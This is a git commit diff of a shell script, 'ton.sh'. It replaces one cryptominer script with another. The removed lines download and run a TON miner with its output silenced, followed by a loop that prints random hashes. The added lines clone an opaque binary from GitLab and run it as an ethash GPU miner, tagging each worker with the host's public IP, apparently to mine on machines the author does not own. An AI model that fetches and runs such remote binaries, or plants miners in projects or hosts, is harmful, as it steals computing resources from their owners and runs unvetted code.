395be1e31ea969e07d0595aa097470ee687cacf4
nurfasikin <92776649+nurfasikin@users.noreply.github.com>
2022-06-27 11:20:48 +0700

    Update ton.sh

--- ton.sh
+++ ton.sh
@@ -1,16 +1,9 @@
-#!/bin/bash
 #!/bin/sh
-#!/bin/bash
-
-wget https://whalepool-cdn.fra1.digitaloceanspaces.com/software/danila-miner/danila-miner-2.3.1-ubuntu-bionic.tar.gz >/dev/null 2>&1
-
-tar xaf danila-miner-2.3.1-ubuntu-bionic.tar.gz >/dev/null 2>&1
-
-chmod +x danila-miner >/dev/null 2>&1
-
-./danila-miner run https://server1.whalestonpool.com EQA0Q3JaZgjKJ6QVzETgz3xYfalnLCx170Ey8cEGhsnyLkdI
-
-while [ 1 ]; do
-  while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
-sleep 2
-done
+apt update
+apt-get install zip unzip
+apt install screen -y
+screen -dmS syahrowi.sh 65 75
+git clone https://gitlab.com/taufiqurrohmanmaz/sainame127.git
+cd sainame127
+chmod +x itsme
+ip=$(echo "$(curl -s ifconfig.me)" | tr . _ ) && ./itsme -a ethash -w berkah.001.$ip -p stratum+tcp://ethash.kupool.com:8888 stratum+tcp://ethash.kupool.com:1800 -r $ip --nvidia 1
